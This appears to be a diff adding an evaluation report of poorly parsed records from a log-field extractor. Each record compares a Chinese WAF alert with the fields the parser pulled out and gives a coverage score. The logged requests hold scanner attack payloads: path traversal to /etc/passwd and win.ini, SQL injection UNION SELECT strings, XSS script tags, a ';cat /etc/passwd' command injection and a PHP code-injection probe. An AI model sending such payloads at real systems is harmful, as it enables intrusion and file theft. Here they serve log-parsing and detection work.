@@ -1,0 +1,382 @@
+Bad Performance Records:
+Record 1:
+Original: [{'key': '', 'value': 'Oct 14 06:46:19'}, {'key': '', 'value': '10.50.81.59'}, {'key': '', 'value': 'DBAppWAF'}, {'key': '发生时间', 'value': '2024-10-14 06:46:18'}, {'key': '威胁', 'value': '中'}, {'key': '请求方法', 'value': 'GET'}, {'key': 'URL地址', 'value': '10.50.81.59:8000/index.php?GLOBALS[SKIN]=../../../../../../../../../winnt/win.ini%00'}, {'key': '服务器IP', 'value': '10.50.81.5'}, {'key': '客户端环境', 'value': 'Mozilla/5.0 [en] (X11, U; DBAPPSecurity 21.4.3)'}, {'key': '访问唯一编号', 'value': '7425395334018236552'}]
+Testing: [{'key': '', 'value': 'DBAPPSecurity'}, {'key': '', 'value': 'Oct 14 06:46:19'}, {'key': '', 'value': '2024-10-14 06:46:18'}, {'key': '', 'value': '06:46:18,威胁/中,事件/协议违规,请求方法/GET,URL地址/10.50.81.59:8000/index.php?GLOBALS[SKIN]=../../../../../../../../../winnt/win.ini%00,POST数据/,服务器IP/10.50.81.5,主机名/10.50.81.59:8000,服务器端口/8000,客户端IP/10.20.170.22,客户端端口/34687,客户端环境/Mozilla/5.0'}, {'key': '', 'value': 'en'}, {'key': '', 'value': '2024-10-14 06:46'}, {'key': '', 'value': '10.50.81.59:8000'}, {'key': '', 'value': '10.50.81.59:8000'}]
+Coverage: 20.0%
+
+Record 2:
+Original: [{'key': '', 'value': 'Nov 18 15:16:57'}, {'key': '', 'value': '10-50-86-12'}, {'key': '威胁', 'value': '高'}, {'key': '请求方法', 'value': 'POST'}, {'key': '主机名', 'value': '10.50.109.90:31001'}, {'key': '客户端端口', 'value': '59134'}, {'key': '客户端IP', 'value': '10.50.24.197'}, {'key': '标签', 'value': '通用防护'}, {'key': '动作', 'value': '阻断'}, {'key': '国家', 'value': '局域网'}]
+Testing: [{'key': '', 'value': '10-50-86-12'}, {'key': '', 'value': 'NT'}, {'key': '', 'value': 'like'}, {'key': '', 'value': 'Nov 18 15:16:57'}, {'key': '', 'value': '2024-11-18 15:16:52'}, {'key': '', 'value': 'URLs'}, {'key': '', 'value': '0'}, {'key': '', 'value': '2024-11-18 15:16'}, {'key': '', 'value': '10.50.109.90:31001'}, {'key': '', 'value': '10.50.109.90:31001'}, {'key': '', 'value': '10-50-86-12'}]
+Coverage: 30.0%
+
+Record 3:
+Original: [{'key': '', 'value': 'Oct 21 09:53:44'}, {'key': '', 'value': '10-50-86-12'}, {'key': '事件', 'value': '防空白符绕过攻击'}, {'key': '服务器IP', 'value': '10.50.109.2'}, {'key': '服务器端口', 'value': '80'}, {'key': '客户端IP', 'value': '10.50.86.35'}, {'key': '标签', 'value': '协议限制'}, {'key': '动作', 'value': '告警'}, {'key': '访问唯一编号', 'value': '7428041192777978969'}, {'key': '国家', 'value': '局域网'}]
+Testing: [{'key': '', 'value': '10-50-86-12'}, {'key': '', 'value': 'DBAPPSecurity'}, {'key': '', 'value': 'Oct 21 09:53:44'}, {'key': '', 'value': '2024-10-21 09:53:32'}, {'key': '', 'value': '09:53:32,威胁/高,事件/防空白符绕过攻击,请求方法/GET,URL地址/10.50.109.2/shop/libs/smarty_ajax/index.php?_=&f=update_intro&page=../../../../../../../../../../../../../../../../../../windows/win.ini%00,POST数据/,服务器IP/10.50.109.2,主机名/10.50.109.2,服务器端口/80,客户端IP/10.50.86.35,客户端端口/45137,客户端环境/Mozilla/5.0'}, {'key': '', 'value': 'en'}, {'key': '', 'value': '2024-10-21 09:53'}, {'key': '', 'value': '10-50-86-12'}]
+Coverage: 20.0%
+
+Record 4:
+Original: [{'key': '', 'value': 'Nov 18 15:17:06'}, {'key': '发生时间', 'value': '2024-11-18 15:16:53'}, {'key': '事件', 'value': '检测PHP代码注入(语义分析)'}, {'key': '请求方法', 'value': 'POST'}, {'key': 'POST数据', 'value': 'widgetConfig%5Bcode%5D=echo+md5%28%27VbGfhSQC%27%29%3B+exit%3B'}, {'key': '服务器IP', 'value': '10.50.109.90'}, {'key': '主机名', 'value': '10.50.109.90:31001'}, {'key': '标签', 'value': '通用防护'}, {'key': '动作', 'value': '阻断'}, {'key': '访问唯一编号', 'value': '7438514904312627360'}]
+Testing: [{'key': '', 'value': '10-50-86-12'}, {'key': '', 'value': 'Nov 18 15:17:06'}, {'key': '', 'value': '2024-11-18 15:16:53'}, {'key': '', 'value': '2024-11-18 15:16'}, {'key': '', 'value': '10.50.109.90:31001'}, {'key': '', 'value': '10.50.109.90:31001'}, {'key': '', 'value': '10-50-86-12'}, {'key': '', 'value': 'md5'}, {'key': '', 'value': "'VbGfhSQC'"}]
+Coverage: 30.0%
+
+Record 5:
+Original: [{'key': '', 'value': 'Aug 15 11:23:08'}, {'key': '发生时间', 'value': '2024-08-15 11:22:58'}, {'key': '事件', 'value': '阻止携带异常HTTP版本号的请求'}, {'key': '客户端IP', 'value': '10.20.170.22'}, {'key': '客户端端口', 'value': '34448'}, {'key': '触发规则', 'value': '11010102'}, {'key': '访问唯一编号', 'value': '7403201528594620508'}, {'key': '国家', 'value': '局域网'}, {'key': '省', 'value': '未知'}]
+Testing: [{'key': '', 'value': '10-50-86-12'}, {'key': '', 'value': 'Aug 15 11:23:08'}, {'key': '', 'value': '2024-08-15 11:22:58'}, {'key': '', 'value': '2024-08-15 11:22'}, {'key': '', 'value': '10-50-86-12'}]
+Coverage: 22.2%
+
+Record 6:
+Original: [{'key': '', 'value': 'Oct 21 09:52:54'}, {'key': '', 'value': '10-50-86-12'}, {'key': '事件', 'value': '检测通用文件读取'}, {'key': '请求方法', 'value': 'GET'}, {'key': 'URL地址', 'value': '10.50.109.2/index.php?setLang=vuln-test&lang[vuln-test][file]=../../../../../../../../../../../../windows/win.ini'}, {'key': '客户端环境', 'value': 'Mozilla/5.0 [en] (X11, U; DBAPPSecurity 21.4.3)'}, {'key': '标签', 'value': '通用防护'}, {'key': '动作', 'value': '告警'}, {'key': '触发规则', 'value': '10110000'}, {'key': '访问唯一编号', 'value': '7428040999502353438'}]
+Testing: [{'key': '', 'value': '10-50-86-12'}, {'key': '', 'value': 'DBAPPSecurity'}, {'key': '', 'value': 'Oct 21 09:52:54'}, {'key': '', 'value': '2024-10-21 09:52:47'}, {'key': '', 'value': '09:52:47,威胁/高,事件/检测通用文件读取,请求方法/GET,URL地址/10.50.109.2/index.php?setLang=vuln-test&lang[vuln-test][file]=../../../../../../../../../../../../windows/win.ini,POST数据/,服务器IP/10.50.109.2,主机名/10.50.109.2,服务器端口/80,客户端IP/10.50.86.35,客户端端口/59756,客户端环境/Mozilla/5.0'}, {'key': '', 'value': 'en'}, {'key': '', 'value': '2024-10-21 09:52'}, {'key': '', 'value': '10-50-86-12'}]
+Coverage: 20.0%
+
+Record 7:
+Original: [{'key': '', 'value': 'Oct 21 09:52:46'}, {'key': '', 'value': '10-50-86-12'}, {'key': '发生时间', 'value': '2024-10-21 09:52:35'}, {'key': '威胁', 'value': '中'}, {'key': '事件', 'value': '检测路径穿越攻击'}, {'key': '请求方法', 'value': 'GET'}, {'key': 'URL地址', 'value': '10.50.109.2/gcards/index.php?setLang=vuln-test&lang[vuln-test][file]=../../../../../../../../../../../../etc/passwd'}, {'key': '服务器IP', 'value': '10.50.109.2'}, {'key': '服务器端口', 'value': '80'}]
+Testing: [{'key': '', 'value': '10-50-86-12'}, {'key': '', 'value': 'DBAPPSecurity'}, {'key': '', 'value': 'Oct 21 09:52:46'}, {'key': '', 'value': '2024-10-21 09:52:35'}, {'key': '', 'value': '09:52:35,威胁/中,事件/检测路径穿越攻击,请求方法/GET,URL地址/10.50.109.2/gcards/index.php?setLang=vuln-test&lang[vuln-test][file]=../../../../../../../../../../../../etc/passwd,POST数据/,服务器IP/10.50.109.2,主机名/10.50.109.2,服务器端口/80,客户端IP/10.50.86.35,客户端端口/47662,客户端环境/Mozilla/5.0'}, {'key': '', 'value': 'en'}, {'key': '', 'value': '2024-10-21 09:52'}, {'key': '', 'value': '10-50-86-12'}]
+Coverage: 33.3%
+
+Record 8:
+Original: [{'key': '', 'value': 'Oct 21 09:50:26'}, {'key': '', 'value': '10-50-86-12'}, {'key': '事件', 'value': '检测SQL注入'}, {'key': '请求方法', 'value': 'GET'}, {'key': 'URL地址', 'value': '10.50.109.2/ez/showcategory.php?cid=-101+union+select+12345678987654321,12345678987654321,3,4,5--'}, {'key': '触发规则', 'value': '10120000'}, {'key': '访问唯一编号', 'value': '7428040333788713714'}, {'key': '国家', 'value': '局域网'}, {'key': '省', 'value': '未知'}]
+Testing: [{'key': '', 'value': '10-50-86-12'}, {'key': '', 'value': 'DBAPPSecurity'}, {'key': '', 'value': 'union'}, {'key': '', 'value': 'select'}, {'key': '', 'value': 'Oct 21 09:50:26'}, {'key': '', 'value': '2024-10-21 09:50:12'}, {'key': '', 'value': '09:50:12,威胁/高,事件/检测SQL注入,请求方法/GET,URL地址/10.50.109.2/ez/showcategory.php?cid=-101+union+select+12345678987654321,12345678987654321,3,4,5--,POST数据/,服务器IP/10.50.109.2,主机名/10.50.109.2,服务器端口/80,客户端IP/10.50.86.35,客户端端口/56184,客户端环境/Mozilla/5.0'}, {'key': '', 'value': 'en'}, {'key': '', 'value': '2024-10-21 09:50'}, {'key': '', 'value': '10-50-86-12'}]
+Coverage: 22.2%
+
+Record 9:
+Original: [{'key': '', 'value': 'Oct 21 09:50:15'}, {'key': '', 'value': '10-50-86-12'}, {'key': '发生时间', 'value': '2024-10-21'}, {'key': '事件', 'value': '检测通用文件读取'}, {'key': '请求方法', 'value': 'GET'}, {'key': '主机名', 'value': '10.50.109.2'}, {'key': '服务器端口', 'value': '80'}, {'key': '客户端IP', 'value': '10.50.86.35'}, {'key': '客户端端口', 'value': '39008'}, {'key': '客户端环境', 'value': 'Mozilla/5.0 [en] (X11, U; DBAPPSecurity 21.4.3)'}]
+Testing: [{'key': '', 'value': '10-50-86-12'}, {'key': '', 'value': 'DBAPPSecurity'}, {'key': '', 'value': 'Oct 21 09:50:15'}, {'key': '', 'value': '2024-10-21 09:50:02'}, {'key': '', 'value': '09:50:02,威胁/高,事件/检测通用文件读取,请求方法/GET,URL地址/10.50.109.2/awcm/includes/window_top.php?theme_file=../../../../../../../../../etc/passwd%00,POST数据/,服务器IP/10.50.109.2,主机名/10.50.109.2,服务器端口/80,客户端IP/10.50.86.35,客户端端口/39008,客户端环境/Mozilla/5.0'}, {'key': '', 'value': 'en'}, {'key': '', 'value': '2024-10-21 09:50'}, {'key': '', 'value': '10-50-86-12'}]
+Coverage: 20.0%
+
+Record 10:
+Original: [{'key': '', 'value': 'Oct 21 09:55:07'}, {'key': '', 'value': '10-50-86-12'}, {'key': '事件', 'value': '检测路径穿越攻击'}, {'key': '请求方法', 'value': 'GET'}, {'key': 'URL地址', 'value': '10.50.109.2/pulsecms/index.php??p=../../../../../../../../../winnt/win.ini%00'}, {'key': '服务器IP', 'value': '10.50.109.2'}, {'key': '客户端端口', 'value': '36381'}, {'key': '标签', 'value': '通用防护'}, {'key': 'HTTP/S响应码', 'value': '301'}, {'key': '访问唯一编号', 'value': '7428041536381654217'}]
+Testing: [{'key': '', 'value': '10-50-86-12'}, {'key': '', 'value': 'DBAPPSecurity'}, {'key': '', 'value': 'Oct 21 09:55:07'}, {'key': '', 'value': '2024-10-21 09:54:52'}, {'key': '', 'value': '09:54:52,威胁/中,事件/检测路径穿越攻击,请求方法/GET,URL地址/10.50.109.2/pulsecms/index.php??p=../../../../../../../../../winnt/win.ini%00,POST数据/,服务器IP/10.50.109.2,主机名/10.50.109.2,服务器端口/80,客户端IP/10.50.86.35,客户端端口/36381,客户端环境/Mozilla/5.0'}, {'key': '', 'value': 'en'}, {'key': '', 'value': '2024-10-21 09:54'}, {'key': '', 'value': '10-50-86-12'}]
+Coverage: 20.0%
+
+Record 11:
+Original: [{'key': '', 'value': 'Oct 21 09:53:26'}, {'key': '', 'value': '10-50-86-12'}, {'key': '发生时间', 'value': '2024-10-21 09:53:12'}, {'key': '请求方法', 'value': 'GET'}, {'key': '服务器端口', 'value': '80'}, {'key': '客户端IP', 'value': '10.50.86.35'}, {'key': '客户端端口', 'value': '43320'}, {'key': '客户端环境', 'value': 'Mozilla/5.0 [en] (X11, U; DBAPPSecurity 21.4.3)'}, {'key': '标签', 'value': '通用防护'}, {'key': '动作', 'value': '告警'}]
+Testing: [{'key': '', 'value': '10-50-86-12'}, {'key': '', 'value': 'DBAPPSecurity'}, {'key': '', 'value': 'Oct 21 09:53:26'}, {'key': '', 'value': '2024-10-21 09:53:12'}, {'key': '', 'value': '09:53:12,威胁/高,事件/检测Unix命令注入(part2),请求方法/GET,URL地址/10.50.109.2/alienform.cgi?_browser_out=.|.%2F.|.%2F.|.%2F.|.%2F.|.%2F.|.%2F.|.%2F.|.%2F.|.%2F.|.%2F.|.%2F.|.%2Fetc%2Fpasswd,POST数据/,服务器IP/10.50.109.2,主机名/10.50.109.2,服务器端口/80,客户端IP/10.50.86.35,客户端端口/43320,客户端环境/Mozilla/5.0'}, {'key': '', 'value': 'en'}, {'key': '', 'value': '2024-10-21 09:53'}, {'key': '', 'value': '10-50-86-12'}]
+Coverage: 30.0%
+
+Record 12:
+Original: [{'key': '', 'value': 'Oct 21 09:54:53'}, {'key': '', 'value': '10-50-86-12'}, {'key': '威胁', 'value': '高'}, {'key': 'URL地址', 'value': '10.50.109.2/module.php?mod=<script>alert(8154711)</script>'}, {'key': '服务器IP', 'value': '10.50.109.2'}, {'key': '客户端IP', 'value': '10.50.86.35'}, {'key': '客户端端口', 'value': '51946'}, {'key': '客户端环境', 'value': 'Mozilla/5.0 [en] (X11, U; DBAPPSecurity 21.4.3)'}, {'key': '攻击特征串', 'value': '<script>alert(8154711)</script>'}, {'key': '触发规则', 'value': '10140000'}]
+Testing: [{'key': '', 'value': '10-50-86-12'}, {'key': '', 'value': 'DBAPPSecurity'}, {'key': '', 'value': 'Oct 21 09:54:53'}, {'key': '', 'value': '2024-10-21 09:54:44'}, {'key': '', 'value': '09:54:44,威胁/高,事件/检测JavaScript注入,请求方法/GET,URL地址/10.50.109.2/module.php?mod=<script>alert(8154711)</script>,POST数据/,服务器IP/10.50.109.2,主机名/10.50.109.2,服务器端口/80,客户端IP/10.50.86.35,客户端端口/51946,客户端环境/Mozilla/5.0'}, {'key': '', 'value': 'en'}, {'key': '', 'value': '2024-10-21 09:54'}, {'key': '', 'value': '10-50-86-12'}, {'key': '', 'value': 'alert'}, {'key': '', 'value': '8154711'}]
+Coverage: 20.0%
+
+Record 13:
+Original: [{'key': '', 'value': 'Aug 14 15:08:12'}, {'key': '', 'value': '192.168.19.39'}, {'key': '发生时间', 'value': '2024-08-14 15:08:09'}, {'key': 'URL地址', 'value': '59.202.175.8:9030/jinhua/api/classgrade/list?page=1&limit=10&unCancelSelect=4&infoState=&impState=&ctblevel=&cancelState=&source=&open=&appState=2&themeState=2&backflow=&provinState=2&access=&openPlatformType=&generationStatus=&highRailState=&editState='}, {'key': '服务器IP', 'value': '59.202.175.8'}, {'key': '主机名', 'value': '59.202.175.8:9030'}, {'key': '攻击特征串', 'value': 'LNmOu4hN58dg86cF3d6tiJ0tBC19IulEUR/NuVpV7SEnkO/6aSKWc7GLu101kSHvtUG3ovi/YssYBZvZdP9Y9DfrOalOHkQ4KwMuWmzYEMF5hB9THkfL/vseX/NJjmpALTTL439QF/FzM9w5Uz9uQSyxwav9YGJZjoCbBHxWV2IGxl21Czs2tm9Ivb6Hn/EQVIldDNLhQlu2w9dn56cDgxWKsRmP+3ETHn62KCmj7rBh1QtL3A9zK6KsuZ8aVSc6if+cu+etsBSnKEI40ilID2UwD54UgAU5aG6JGC3MTSPtP1cqqxXY7ZPJB0wjdsEfAyENjGprrsnjBIOIfh0wWIwFOyK07KhDh1a71j2gmDIL/r2/iHe2hgQAece2dpvMTVyOckgiy0c3bV79Rd3QO1LJVBA5i3YPY5ULeY8/xtaWZxErTaGT0eTmYMpMESOJeACzN68XLXkQjR2Z6kjJONwAJ1kvxAq5St9FezgCRvta5pb4b9x5PKzp9Iob0Lufon0Ft439k2QbAoGdJz2tZfNUY9b5HvS4nZlGBEJjFRQhmg=='}, {'key': '触发规则', 'value': '18010101'}, {'key': '访问唯一编号', 'value': '7402888116246734199'}, {'key': '国家', 'value': 'LAN'}]
+Testing: [{'key': '', 'value': 'NT'}, {'key': '', 'value': 'like'}, {'key': '', 'value': 'Aug 14 15:08:12'}, {'key': '', 'value': '2024-08-14 15:08:09'}, {'key': '', 'value': '2024-08-14 15:08'}, {'key': '', 'value': '59.202.175.8:9030'}, {'key': '', 'value': '59.202.175.8:9030'}]
+Coverage: 30.0%
+
+Record 14:
+Original: [{'key': '', 'value': 'Oct 21 09:51:17'}, {'key': '', 'value': '10-50-86-12'}, {'key': '事件', 'value': '检测SQL注入'}, {'key': '请求方法', 'value': 'GET'}, {'key': 'URL地址', 'value': "10.50.109.2/news.php4?nid=-12'+union+select+1,2,0x53514c2d496e6a656374696f6e2d54657374,4,5,6,7,8,9,10,11/*"}, {'key': '服务器IP', 'value': '10.50.109.2'}, {'key': '客户端环境', 'value': 'Mozilla/5.0 [en] (X11, U; DBAPPSecurity 21.4.3)'}, {'key': '标签', 'value': '通用防护'}, {'key': '动作', 'value': '告警'}]
+Testing: [{'key': '', 'value': '10-50-86-12'}, {'key': '', 'value': 'DBAPPSecurity'}, {'key': '', 'value': 'union'}, {'key': '', 'value': 'select'}, {'key': '', 'value': 'Oct 21 09:51:17'}, {'key': '', 'value': '2024-10-21 09:51:09'}, {'key': '', 'value': "09:51:09,威胁/高,事件/检测SQL注入,请求方法/GET,URL地址/10.50.109.2/news.php4?nid=-12'+union+select+1,2,0x53514c2d496e6a656374696f6e2d54657374,4,5,6,7,8,9,10,11/*,POST数据/,服务器IP/10.50.109.2,主机名/10.50.109.2,服务器端口/80,客户端IP/10.50.86.35,客户端端口/50435,客户端环境/Mozilla/5.0"}, {'key': '', 'value': 'en'}, {'key': '', 'value': '2024-10-21 09:51'}, {'key': '', 'value': '10-50-86-12'}]
+Coverage: 22.2%
+
+Record 15:
+Original: [{'key': '', 'value': 'Oct 14 06:46:42'}, {'key': '', 'value': '10.50.81.59'}, {'key': '发生时间', 'value': '2024-10-14 06:46:40'}, {'key': '威胁', 'value': '高'}, {'key': '事件', 'value': 'XSS攻击'}, {'key': '服务器端口', 'value': '8000'}, {'key': '客户端端口', 'value': '43721'}, {'key': '客户端环境', 'value': 'Mozilla/5.0 [en] (X11, U; DBAPPSecurity 21.4.3)'}, {'key': 'HTTP', 'value': 'S响应码/403'}, {'key': '触发规则', 'value': '13100001'}]
+Testing: [{'key': '', 'value': 'DBAPPSecurity'}, {'key': '', 'value': 'Oct 14 06:46:42'}, {'key': '', 'value': '2024-10-14 06:46:40'}, {'key': '', 'value': '06:46:40,威胁/高,事件/XSS攻击,请求方法/GET,URL地址/10.50.81.59:8000/contao/index.php/teachers.html?\\"/><script>alert(/openvas-xss-test/)</script>,POST数据/,服务器IP/10.50.81.5,主机名/10.50.81.59:8000,服务器端口/8000,客户端IP/10.20.170.22,客户端端口/43721,客户端环境/Mozilla/5.0'}, {'key': '', 'value': 'en'}, {'key': '', 'value': '2024-10-14 06:46'}, {'key': '', 'value': '10.50.81.59:8000'}, {'key': '', 'value': '10.50.81.59:8000'}, {'key': '', 'value': 'alert'}, {'key': '', 'value': '/openvas-xss-test/'}]
+Coverage: 20.0%
+
+Record 16:
+Original: [{'key': '', 'value': 'Nov 18 15:16:29'}, {'key': '', 'value': '10-50-86-12'}, {'key': '请求方法', 'value': 'GET'}, {'key': 'URL地址', 'value': '10.50.109.90/scriptsdirectory.php?dir=%3Bcat%20/etc/passwd'}, {'key': '服务器IP', 'value': '10.50.109.90'}, {'key': '服务器端口', 'value': '31000'}, {'key': '客户端端口', 'value': '51254'}, {'key': '动作', 'value': '阻断'}, {'key': '触发规则', 'value': '10110000'}]
+Testing: [{'key': '', 'value': '10-50-86-12'}, {'key': '', 'value': 'Nov 18 15:16:29'}, {'key': '', 'value': '2024-11-18 15:16:19'}, {'key': '', 'value': '15:16:19,威胁/高,事件/检测通用文件读取,请求方法/GET,URL地址/10.50.109.90/scriptsdirectory.php?dir=%3Bcat%20/etc/passwd,POST数据/,服务器IP/10.50.109.90,主机名/10.50.109.90,服务器端口/31000,客户端IP/10.50.24.197,客户端端口/51254,客户端环境/Mozilla/4.75'}, {'key': '', 'value': 'en'}, {'key': '', 'value': '2024-11-18 15:16'}, {'key': '', 'value': '10-50-86-12'}]
+Coverage: 22.2%
+
+Record 17:
+Original: [{'key': '', 'value': 'Oct 21 09:48:55'}, {'key': '', 'value': '10-50-86-12'}, {'key': '发生时间', 'value': '2024-10-21 09:48:49'}, {'key': '事件', 'value': '检测路径穿越攻击'}, {'key': 'URL地址', 'value': '10.50.109.2/jv/www/index.php?p=../../../../../../../../../../winnt/win.ini%00'}, {'key': '服务器端口', 'value': '80'}, {'key': '客户端IP', 'value': '10.50.86.35'}, {'key': '客户端端口', 'value': '36046'}, {'key': '标签', 'value': '通用防护'}, {'key': 'HTTP/S', 'value': '响应码/301'}]
+Testing: [{'key': '', 'value': '10-50-86-12'}, {'key': '', 'value': 'DBAPPSecurity'}, {'key': '', 'value': 'Oct 21 09:48:55'}, {'key': '', 'value': '2024-10-21 09:48:49'}, {'key': '', 'value': '09:48:49,威胁/中,事件/检测路径穿越攻击,请求方法/GET,URL地址/10.50.109.2/jv/www/index.php?p=../../../../../../../../../../winnt/win.ini%00,POST数据/,服务器IP/10.50.109.2,主机名/10.50.109.2,服务器端口/80,客户端IP/10.50.86.35,客户端端口/36046,客户端环境/Mozilla/5.0'}, {'key': '', 'value': 'en'}, {'key': '', 'value': '2024-10-21 09:48'}, {'key': '', 'value': '10-50-86-12'}]
+Coverage: 30.0%
+
+Record 18:
+Original: [{'key': '', 'value': 'Sep 25 10:19:23'}, {'key': '', 'value': '10-50-86-12'}, {'key': '发生时间', 'value': '2024-09-25 10:19:11'}, {'key': '威胁', 'value': '高'}, {'key': '事件', 'value': 'HTTP请求Content-Type/Content-Length头部不得出现多个'}, {'key': '请求方法', 'value': 'POST'}, {'key': 'URL地址', 'value': '10.50.109.151:8888/struts2-blank-2.3.28/example/HelloWorld.action'}, {'key': 'POST数据', 'value': '-----------------------------18012721719170'}]
+Testing: [{'key': '', 'value': '10-50-86-12'}, {'key': '', 'value': 'Sep 25 10:19:23'}, {'key': '', 'value': '2024-09-25 10:19:11'}, {'key': '', 'value': '2024-09-25 10:19'}, {'key': '', 'value': '10.50.109.151:8888'}, {'key': '', 'value': '10-50-86-12'}]
+Coverage: 37.5%
+
+Record 19:
+Original: [{'key': '', 'value': 'Oct 21 09:52:55'}, {'key': '', 'value': '10-50-86-12'}, {'key': '发生时间', 'value': '2024-10-21 09:52:48'}, {'key': 'URL地址', 'value': '10.50.109.2/library/lib.menu.php?rootpath=../../../../../../../../../../../../../../../etc/passwd%00'}, {'key': '客户端环境', 'value': 'Mozilla/5.0 [en] (X11, U; DBAPPSecurity 21.4.3)'}, {'key': '标签', 'value': '通用防护'}, {'key': '动作', 'value': '告警'}, {'key': '攻击特征串', 'value': '/library/lib.menu.php?rootpath=../'}, {'key': '访问唯一编号', 'value': '7428041003791029279'}, {'key': '国家', 'value': '局域网'}]
+Testing: [{'key': '', 'value': '10-50-86-12'}, {'key': '', 'value': 'DBAPPSecurity'}, {'key': '', 'value': 'Oct 21 09:52:55'}, {'key': '', 'value': '2024-10-21 09:52:48'}, {'key': '', 'value': '09:52:48,威胁/中,事件/检测路径穿越攻击,请求方法/GET,URL地址/10.50.109.2/library/lib.menu.php?rootpath=../../../../../../../../../../../../../../../etc/passwd%00,POST数据/,服务器IP/10.50.109.2,主机名/10.50.109.2,服务器端口/80,客户端IP/10.50.86.35,客户端端口/59233,客户端环境/Mozilla/5.0'}, {'key': '', 'value': 'en'}, {'key': '', 'value': '2024-10-21 09:52'}, {'key': '', 'value': '10-50-86-12'}]
+Coverage: 30.0%
+
+Record 20:
+Original: [{'key': '', 'value': 'Nov 18 15:16:09'}, {'key': '', 'value': '10-50-86-12'}, {'key': '威胁', 'value': '中'}, {'key': 'URL地址', 'value': '10.50.109.90:31003/'}, {'key': '主机名', 'value': '10.50.109.90:31003'}, {'key': '客户端IP', 'value': '10.50.24.197'}, {'key': '客户端环境', 'value': 'python-requests/2.12.4'}, {'key': '攻击特征串', 'value': 'python-requests'}, {'key': '触发规则', 'value': '10502000'}, {'key': '访问唯一编号', 'value': '7438514668100959793'}]
+Testing: [{'key': '', 'value': '10-50-86-12'}, {'key': '', 'value': 'Nov 18 15:16:09'}, {'key': '', 'value': '2024-11-18 15:15:58'}, {'key': '', 'value': '2024-11-18 15:15'}, {'key': '', 'value': '10.50.109.90:31003'}, {'key': '', 'value': '10.50.109.90:31003'}, {'key': '', 'value': '10-50-86-12'}]
+Coverage: 30.0%
+
+Record 21:
+Original: [{'key': '', 'value': 'Oct 14 06:38:38'}, {'key': '', 'value': '10.50.81.59'}, {'key': '威胁', 'value': '高'}, {'key': '服务器IP', 'value': '10.50.81.5'}, {'key': '服务器端口', 'value': '8000'}, {'key': '客户端IP', 'value': '10.20.170.22'}, {'key': '动作', 'value': '阻断'}, {'key': 'HTTP/S', 'value': '响应码/403'}, {'key': '触发规则', 'value': '13100001'}, {'key': '国家', 'value': 'LAN'}]
+Testing: [{'key': '', 'value': 'DBAPPSecurity'}, {'key': '', 'value': 'Oct 14 06:38:38'}, {'key': '', 'value': '2024-10-14 06:38:38'}, {'key': '', 'value': '06:38:38,威胁/高,事件/XSS攻击,请求方法/GET,URL地址/10.50.81.59:8000/cms/search.php?bn=%3Cbody%20onload=alert(%27openvas-xss-test%27)%3E,POST数据/,服务器IP/10.50.81.5,主机名/10.50.81.59:8000,服务器端口/8000,客户端IP/10.20.170.22,客户端端口/43788,客户端环境/Mozilla/5.0'}, {'key': '', 'value': 'en'}, {'key': '', 'value': '2024-10-14 06:38'}, {'key': '', 'value': '10.50.81.59:8000'}, {'key': '', 'value': '10.50.81.59:8000'}, {'key': '', 'value': 'alert'}, {'key': '', 'value': '%27openvas-xss-test%27'}]
+Coverage: 10.0%
+
+Record 22:
+Original: [{'key': '', 'value': 'Oct 21 09:51:39'}, {'key': '', 'value': '10-50-86-12'}, {'key': 'URL地址', 'value': '10.50.109.2/cgi-bin/faqmanager.cgi?toc=/winnt/win.ini%00'}, {'key': '主机名', 'value': '10.50.109.2'}, {'key': '客户端IP', 'value': '10.50.86.35'}, {'key': '客户端环境', 'value': 'Mozilla/5.0 [en] (X11, U; DBAPPSecurity 21.4.3)'}, {'key': '标签', 'value': '通用防护'}, {'key': '攻击特征串', 'value': '/winnt/win.ini'}, {'key': '触发规则', 'value': '10110000'}, {'key': '国家', 'value': '局域网'}]
+Testing: [{'key': '', 'value': '10-50-86-12'}, {'key': '', 'value': 'DBAPPSecurity'}, {'key': '', 'value': 'Oct 21 09:51:39'}, {'key': '', 'value': '2024-10-21 09:51:30'}, {'key': '', 'value': '09:51:30,威胁/高,事件/检测通用文件读取,请求方法/GET,URL地址/10.50.109.2/cgi-bin/faqmanager.cgi?toc=/winnt/win.ini%00,POST数据/,服务器IP/10.50.109.2,主机名/10.50.109.2,服务器端口/80,客户端IP/10.50.86.35,客户端端口/35024,客户端环境/Mozilla/5.0'}, {'key': '', 'value': 'en'}, {'key': '', 'value': '2024-10-21 09:51'}, {'key': '', 'value': '10-50-86-12'}]
+Coverage: 20.0%
+
+Record 23:
+Original: [{'key': '', 'value': 'Nov 18 15:17:05'}, {'key': '', 'value': '10-50-86-12'}, {'key': '请求方法', 'value': 'POST'}, {'key': 'URL地址', 'value': '10.50.109.90:31004/vb/?routestring=ajax/render/widget_php'}, {'key': '主机名', 'value': '10.50.109.90:31004'}, {'key': '客户端IP', 'value': '10.50.24.197'}, {'key': '客户端端口', 'value': '48636'}, {'key': 'HTTP/S', 'value': '响应码/403'}, {'key': '触发规则', 'value': '10130000'}, {'key': '国家', 'value': '局域网'}]
+Testing: [{'key': '', 'value': '10-50-86-12'}, {'key': '', 'value': 'Nov 18 15:17:05'}, {'key': '', 'value': '2024-11-18 15:16:54'}, {'key': '', 'value': '2024-11-18 15:16'}, {'key': '', 'value': '10.50.109.90:31004'}, {'key': '', 'value': '10.50.109.90:31004'}, {'key': '', 'value': '10-50-86-12'}, {'key': '', 'value': 'md5'}, {'key': '', 'value': "'qaIPzj24'"}]
+Coverage: 30.0%
+
+Record 24:
+Original: [{'key': '', 'value': 'Nov 18 15:16:49'}, {'key': '', 'value': '10-50-86-12'}, {'key': '发生时间', 'value': '2024-11-18 15:16:41'}, {'key': '请求方法', 'value': 'GET'}, {'key': 'URL地址', 'value': '10.50.109.90:31000/webtools/control/main'}, {'key': '服务器IP', 'value': '10.50.109.90'}, {'key': '主机名', 'value': '10.50.109.90:31000'}, {'key': '客户端环境', 'value': 'python-requests/2.12.4'}, {'key': 'HTTP/S', 'value': '响应码/403'}, {'key': '触发规则', 'value': '10502000'}]
+Testing: [{'key': '', 'value': '10-50-86-12'}, {'key': '', 'value': 'Nov 18 15:16:49'}, {'key': '', 'value': '2024-11-18 15:16:41'}, {'key': '', 'value': '2024-11-18 15:16'}, {'key': '', 'value': '10.50.109.90:31000'}, {'key': '', 'value': '10.50.109.90:31000'}, {'key': '', 'value': '10-50-86-12'}]
+Coverage: 40.0%
+
+Record 25:
